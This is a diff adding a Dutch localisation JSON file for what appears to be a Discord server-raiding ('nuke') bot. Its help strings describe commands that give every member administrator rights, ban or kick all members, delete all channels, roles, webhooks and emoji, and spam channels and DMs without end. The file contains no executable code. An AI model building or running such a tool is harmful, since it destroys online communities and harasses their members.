@@ -1,0 +1,247 @@
+{
+  "config_not_found": "Fout: config.json niet gevonden!",
+  "config_create_instruction": "Maak een config.json bestand aan met je bot token en eigenaar ID.",
+  "config_example": "Voorbeeld: {\"token\": \"BOT_TOKEN\", \"prefix\": \".!\", \"owner_id\": \"YOUR_USER_ID\", \"whitelist\": [], \"language\": \"nl\"}",
+  "config_invalid_json": "Fout: config.json is geen geldige JSON!",
+  "token_not_found": "Fout: Token niet gevonden in config.json!",
+  "token_add_instruction": "Voeg je bot token en eigenaar ID toe aan config.json",
+  "token_example": "Voorbeeld: {\"token\": \"BOT_TOKEN\", \"prefix\": \".!\", \"owner_id\": \"YOUR_USER_ID\", \"whitelist\": []}",
+  "token_loaded": "[CONFIG] Bot token geladen uit config.json",
+
+  "ready_online": "[KLAAR] {bot_user} is nu online!",
+  "ready_bot_id": "[KLAAR] Bot ID: {bot_id}",
+  "bot_started": "BOT GESTART - {bot_user} (ID: {bot_id}) | Verbonden met {guild_count} server(s): {guild_list}",
+  "bot_prefix": "Bot prefix: {prefix} | Eigenaar ID: {owner_id}",
+  "bot_shutdown": "BOT AFSLUITEN - Geïnitieerd door: {user} (ID: {user_id}) | Server: {guild} (ID: {guild_id})",
+  "bot_shutdown_complete": "BOT AFSLUITEN VOLTOOID",
+  "bot_joined_guild": "BOT TOEGETREDEN TOT SERVER - Server: {guild} (ID: {guild_id}) | Leden: {member_count} | Eigenaar: {owner} (ID: {owner_id})",
+  "bot_left_guild": "BOT VERLIET SERVER - Server: {guild} (ID: {guild_id})",
+
+  "unauthorized": "ONGEAUTORISEERDE TOEGANG - Gebruiker: {user} (ID: {user_id}) | Commando: {command} | Server: {guild} (ID: {guild_id})",
+  "unauthorized_message": "⛔ Je bent niet geautoriseerd om deze bot te gebruiken!",
+
+  "command_executed": "COMMANDO UITGEVOERD - Gebruiker: {user} (ID: {user_id}) | Commando: {command} {args} | Server: {guild} (ID: {guild_id}) | Kanaal: #{channel}",
+  "command_error": "COMMANDO FOUT - Gebruiker: {user} (ID: {user_id}) | Commando: {command} | Server: {guild} | Fout: {error}",
+
+  "help_sent": "Helpmenu verzonden naar je DM's!",
+  "help_dm_failed": "Ik kan je geen DM sturen! Schakel DM's van serverleden in.",
+  "button_unauthorized": "⛔ Je kunt deze knoppen niet gebruiken!",
+
+  "ban_success": "{member} verbannen",
+  "ban_yourself": "Je kunt jezelf niet verbannen!",
+  "ban_higher_role": "Je kunt niemand verbannen met een hogere of gelijke rol!",
+  "ban_bot_no_permission": "Ik kan niemand verbannen met een hogere of gelijke rol dan ik!",
+  "ban_no_permission": "Ik heb geen toestemming om deze gebruiker te verbannen!",
+  "ban_dm": "Je bent verbannen in **{guild}** voor {reason}",
+
+  "unban_success": "{user} ontbannen",
+  "unban_not_found": "Gebruiker niet gevonden of niet verbannen!",
+  "unban_no_permission": "Ik heb geen toestemming om gebruikers te ontbannen!",
+
+  "kick_success": "{member} gekickt",
+  "kick_yourself": "Je kunt jezelf niet kicken!",
+  "kick_higher_role": "Je kunt niemand kicken met een hogere of gelijke rol!",
+  "kick_bot_no_permission": "Ik kan niemand kicken met een hogere of gelijke rol dan ik!",
+  "kick_no_permission": "Ik heb geen toestemming om deze gebruiker te kicken!",
+  "kick_dm": "Je bent gekickt uit **{guild}** voor {reason}",
+
+  "mute_success": "{member} gemute voor {duration}",
+  "mute_yourself": "Je kunt jezelf niet muten!",
+  "mute_higher_role": "Je kunt niemand muten met een hogere of gelijke rol!",
+  "mute_bot_no_permission": "Ik kan niemand muten met een hogere of gelijke rol dan ik!",
+  "mute_invalid_unit": "Ongeldige tijdseenheid! Gebruik s (seconden), m (minuten), h (uren) of d (dagen)",
+  "mute_invalid_format": "Ongeldig duurformaat! Voorbeeld: 10m, 1h, 30s, 1d",
+  "mute_no_permission": "Ik heb geen toestemming om deze gebruiker te time-outen!",
+  "mute_dm": "Je bent gemute in **{guild}** voor {reason}",
+
+  "unmute_success": "{member} geunmute",
+  "unmute_no_permission": "Ik heb geen toestemming om de time-out van deze gebruiker te verwijderen!",
+
+  "purge_success": "{count} berichten verwijderd in {channel}",
+  "purge_invalid_amount": "Geef een positief aantal berichten op om te verwijderen!",
+  "purge_too_many": "Je kunt maximaal 1000 berichten tegelijk verwijderen!",
+  "purge_no_permission": "Ik heb geen toestemming om berichten in dit kanaal te verwijderen!",
+
+  "god_activated": "God-modus geactiveerd voor {user}",
+  "god_no_permission": "Ik heb geen toestemming om rollen te maken of toe te wijzen!",
+
+  "god_all_initiated": "👑 GOD-ALL GESTART 👑\nAdministratorrechten geven aan alle leden...",
+  "god_all_complete": "God-modus geactiveerd voor {count} leden",
+
+  "nuke_all_starting": "Nuke-all operatie starten... Dit kan even duren.",
+  "nuke_all_complete": "Nuke-all voltooid: {channels} kanalen, {categories} categorieën, {roles} rollen verwijderd",
+  "nuke_all_no_permission": "Ik heb geen toestemming om de nuke-all operatie uit te voeren!",
+
+  "delchannel_success": "#{channel} verwijderd",
+  "delchannel_no_permission": "Ik heb geen toestemming om dat kanaal te verwijderen!",
+
+  "nuke_channel_success": "{channel} genuked",
+  "nuke_channel_no_permission": "Ik heb geen toestemming om kanalen te verwijderen/maken!",
+
+  "ban_all_starting": "Ban-all operatie starten... Dit kan even duren.",
+  "ban_all_complete": "{count} leden verbannen",
+  "ban_all_no_permission": "Ik heb geen toestemming om leden te verbannen!",
+
+  "kick_all_starting": "Kick-all operatie starten... Dit kan even duren.",
+  "kick_all_complete": "{count} leden gekickt",
+  "kick_all_no_permission": "Ik heb geen toestemming om leden te kicken!",
+
+  "mute_all_starting": "Mute-all operatie starten voor {duration}... Dit kan even duren.",
+  "mute_all_complete": "{count} leden gemute voor {duration}",
+  "mute_all_no_permission": "Ik heb geen toestemming om leden te time-outen!",
+
+  "death_initiated": "⚠️ DEATH COMMANDO GESTART ⚠️\nAlle kanalen en rollen verwijderen en alle leden verbannen...",
+  "death_complete": "DEATH voltooid: {banned} verbannen, {channels} kanalen verwijderd, {roles} rollen verwijderd",
+  "death_no_permission": "Ik heb geen toestemming om het DEATH commando uit te voeren!",
+
+  "brainfuck_initiated": "🔥 BRAINFUCK ONEINDIGE MODUS GESTART 🔥\nAlle kanalen verwijderen...\nDaarna continu kanalen maken en spammen voor altijd!",
+  "brainfuck_active": "⚡ ONEINDIGE MODUS ACTIEF - Maken en spammen voor altijd!",
+  "brainfuck_no_permission": "Ik heb geen toestemming om het BRAINFUCK commando uit te voeren!",
+
+  "spam_infinite_started": "⚠️ ONEINDIGE SPAM MODUS GEACTIVEERD ⚠️\nSpammen in alle kanalen: \"{message}\"\n\nDit zal oneindig doorgaan!",
+  "spam_starting": "Spam gestart: \"{message}\" {count} keer verzenden in elk kanaal...",
+  "spam_complete": "Spam voltooid: {sent} berichten verzonden in {channels} kanalen",
+  "spam_no_permission": "Ik heb geen toestemming om berichten in kanalen te verzenden!",
+
+  "rename_server_success": "Server hernoemd naar **{name}**",
+  "rename_server_no_permission": "Ik heb geen toestemming om de server te hernoemen!",
+
+  "server_icon_success": "Servericoon succesvol bijgewerkt",
+  "server_icon_failed": "Afbeelding downloaden van URL mislukt!",
+  "server_icon_no_permission": "Ik heb geen toestemming om het servericoon te wijzigen!",
+
+  "server_banner_success": "Serverbanner succesvol bijgewerkt",
+  "server_banner_no_feature": "Deze server heeft geen toegang tot banners! (Vereist boost niveau 2)",
+  "server_banner_failed": "Afbeelding downloaden van URL mislukt!",
+  "server_banner_no_permission": "Ik heb geen toestemming om de serverbanner te wijzigen!",
+
+  "server_desc_success": "Serverbeschrijving succesvol bijgewerkt",
+  "server_desc_no_permission": "Ik heb geen toestemming om de serverbeschrijving te wijzigen!",
+
+  "nick_success": "Nickname van {member} gewijzigd naar **{nickname}**",
+  "nick_higher_role": "Ik kan de nickname van {member} niet wijzigen - ze hebben een hogere of gelijke rol dan ik!",
+  "nick_no_permission": "Ik heb geen toestemming om de nickname van {member} te wijzigen!",
+
+  "nick_all_starting": "Nick-all operatie starten... Alle nicknames instellen op \"{nickname}\"",
+  "nick_all_complete": "Nick-all voltooid: {count} nicknames gewijzigd, {failed} mislukt",
+  "nick_all_no_permission": "Ik heb geen toestemming om nicknames te wijzigen!",
+
+  "role_spam_starting": "Role-spam operatie starten... {count} rollen maken met naam \"{name}\"",
+  "role_spam_complete": "Role-spam voltooid: {created} rollen gemaakt, {failed} mislukt",
+  "role_spam_invalid_count": "Geef een positief aantal rollen op om te maken!",
+  "role_spam_too_many": "Je kunt maximaal 250 rollen tegelijk maken!",
+  "role_spam_no_permission": "Ik heb geen toestemming om rollen te maken!",
+
+  "webhook_nuke_starting": "Webhook-nuke operatie starten... Alle webhooks verwijderen.",
+  "webhook_nuke_complete": "Webhook-nuke voltooid: {count} webhooks verwijderd",
+  "webhook_nuke_no_permission": "Ik heb geen toestemming om webhooks te beheren!",
+
+  "strip_yourself": "Je kunt je eigen rollen niet verwijderen!",
+  "strip_higher_role": "Ik kan de rollen van {member} niet verwijderen - ze hebben een hogere of gelijke rol dan ik!",
+  "strip_no_roles": "{member} heeft geen verwijderbare rollen!",
+  "strip_success": "{count} rollen verwijderd van {member}",
+  "strip_no_permission": "Ik heb geen toestemming om rollen van {member} te verwijderen!",
+
+  "emoji_nuke_starting": "Emoji-nuke operatie starten... Alle aangepaste emoji's verwijderen.",
+  "emoji_nuke_complete": "Emoji-nuke voltooid: {count} emoji's verwijderd",
+  "emoji_nuke_no_permission": "Ik heb geen toestemming om emoji's te beheren!",
+
+  "shuffle_channels_starting": "Shuffle-channels operatie starten... Alle kanalen willekeurig herschikken.",
+  "shuffle_channels_complete": "Shuffle-channels voltooid: {count} kanalen herschikt",
+  "shuffle_channels_no_permission": "Ik heb geen toestemming om kanalen te beheren!",
+
+  "voice_scatter_starting": "Voice-scatter operatie starten... {users} gebruikers verspreiden over {channels} kanalen.",
+  "voice_scatter_complete": "Voice-scatter voltooid: {count} gebruikers verplaatst",
+  "voice_scatter_need_channels": "Minstens 2 spraakkanalen nodig om gebruikers te verspreiden!",
+  "voice_scatter_no_users": "Geen gebruikers in spraakkanalen!",
+  "voice_scatter_no_permission": "Ik heb geen toestemming om leden te verplaatsen!",
+
+  "move_all_starting": "Move-all operatie starten... {users} gebruikers verplaatsen naar {channel}.",
+  "move_all_complete": "Move-all voltooid: {count} gebruikers verplaatst naar {channel}",
+  "move_all_no_users": "Geen gebruikers in spraakkanalen!",
+  "move_all_no_permission": "Ik heb geen toestemming om leden te verplaatsen!",
+
+  "mention_spam_starting": "Mention-spam operatie starten... {count} vermeldingen verzenden.",
+  "mention_spam_complete": "Mention-spam voltooid: {count} vermeldingen verzonden",
+  "mention_spam_invalid_count": "Geef een positief getal op!",
+  "mention_spam_too_many": "Maximum 100 vermeldingen tegelijk!",
+  "mention_spam_no_permission": "Ik heb geen toestemming om berichten te verzenden of te vermelden!",
+
+  "dm_success": "Bericht verzonden naar {user}",
+  "dm_failed": "Kon geen DM sturen naar {user} - ze hebben DM's uitgeschakeld",
+
+  "dmall_starting": "DM-all operatie starten... Bericht verzenden naar alle leden.",
+  "dmall_complete": "DM-all voltooid: {success} berichten verzonden, {failed} mislukt",
+
+  "serverinfo_sent": "Serverinfo verzonden naar je DM's!",
+  "serverinfo_dm_failed": "Ik kan je geen DM sturen! Schakel DM's van serverleden in.",
+
+  "shutdown_message": "Bot wordt afgesloten",
+  "shutdown_farewell": "🔴 Bot wordt afgesloten...",
+  "shutdown_initiated": "[AFSLUITEN] Bot afsluiten geïnitieerd door {user}",
+  "shutdown_now": "[AFSLUITEN] Bot wordt nu afgesloten...",
+
+  "help_footer": "Pagina {page}/{total} • Gebruik knoppen om te navigeren",
+
+  "help_page1_title": "🔥 Bot Commando's - Kernkracht 🔥",
+  "help_page1_desc": "Belangrijkste commando's om de controle te nemen",
+  "help_god": "Geef jezelf administratorrol",
+  "help_god_all": "Geef IEDEREEN administratorrechten",
+  "help_death": "☠️ Ultieme vernietiging - Verban iedereen, verwijder alle kanalen en rollen",
+  "help_brainfuck": "🔥 Verwijder alle kanalen, maak en spam oneindig",
+  "help_help": "Toon dit helpmenu",
+
+  "help_page2_title": "Bot Commando's - Moderatie",
+  "help_page2_desc": "Basis moderatie commando's",
+  "help_ban": "Verban een gebruiker van de server",
+  "help_unban": "Ontban een gebruiker via hun ID",
+  "help_kick": "Kick een gebruiker van de server",
+  "help_mute": "Time-out een gebruiker (bijv. 10m, 1h, 1d)",
+  "help_unmute": "Verwijder time-out van een gebruiker",
+
+  "help_page3_title": "Bot Commando's - Massa Moderatie",
+  "help_page3_desc": "Massa moderatie commando's",
+  "help_ban_all": "Verban alle leden op de server",
+  "help_kick_all": "Kick alle leden van de server",
+  "help_mute_all": "Time-out alle leden op de server",
+  "help_purge": "Verwijder een aantal berichten uit het kanaal",
+
+  "help_page4_title": "Bot Commando's - Destructief",
+  "help_page4_desc": "⚠️ Commando's die permanente schade veroorzaken",
+  "help_nuke": "Verwijder en hermaak kanaal om alle berichten te wissen",
+  "help_nuke_all": "Verwijder ALLE kanalen, categorieën en rollen",
+  "help_delchannel": "Verwijder een specifiek kanaal",
+  "help_webhook_nuke": "Verwijder alle webhooks op server",
+  "help_emoji_nuke": "Verwijder alle aangepaste emoji's",
+
+  "help_page5_title": "Bot Commando's - Trollen",
+  "help_page5_desc": "Leuke, vervelende commando's (meestal omkeerbaar)",
+  "help_nick_all": "Stel ieders nickname in",
+  "help_shuffle_channels": "Herschik alle kanalen willekeurig",
+  "help_voice_scatter": "Verspreid gebruikers over spraakkanalen",
+  "help_move_all": "Verplaats alle gebruikers naar spraakkanaal",
+  "help_mention_spam": "Ghost ping spam (max 100)",
+
+  "help_page6_title": "Bot Commando's - Serverbeheer",
+  "help_page6_desc": "Server aanpassingscommando's",
+  "help_rename_server": "Hernoem de server",
+  "help_server_icon": "Wijzig het servericoon",
+  "help_server_banner": "Wijzig serverbanner (boost lvl 2+)",
+  "help_server_desc": "Wijzig serverbeschrijving",
+  "help_nick": "Wijzig nickname van een gebruiker",
+
+  "help_page7_title": "Bot Commando's - Rollen & Spam",
+  "help_page7_desc": "Rollenbeheer en spam commando's",
+  "help_role_spam": "Massa maak rollen",
+  "help_strip": "Verwijder alle rollen van een gebruiker",
+  "help_spam": "Spam bericht in alle kanalen (0 = oneindig)",
+
+  "help_page8_title": "Bot Commando's - Hulpmiddelen & DM",
+  "help_page8_desc": "Hulpmiddelen en berichtcommando's",
+  "help_dm": "DM een specifieke gebruiker",
+  "help_dmall": "DM alle gebruikers op de server",
+  "help_serverinfo": "Krijg gedetailleerde serverinformatie",
+  "help_shutdown": "Sluit de bot af (Alleen Admin)",
+
+  "error_occurred": "Er is een fout opgetreden: {error}"
+}
